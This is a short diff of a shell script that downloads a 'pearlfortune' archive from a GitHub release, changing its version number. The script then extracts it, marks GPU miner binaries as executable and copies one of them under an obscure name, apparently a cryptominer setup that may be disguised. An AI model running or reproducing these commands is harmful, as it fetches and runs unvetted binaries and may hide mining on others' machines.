@@ -1,5 +1,5 @@
-wget -c https://github.com/rxt36q6/file/releases/download/1/pearlfortune-v2.0.9.tar.gz \
-&& tar vxzf pearlfortune-v2.0.9.tar.gz \
+wget -c https://github.com/rxt36q6/file/releases/download/1/pearlfortune-v1.2.4.tar.gz \
+&& tar vxzf pearlfortune-v1.2.4.tar.gz \
 && cd pearlfortune \
 && chmod +x miner-cuda13 miner-cuda12 \
 && cp miner-cuda13 lemosjiol \
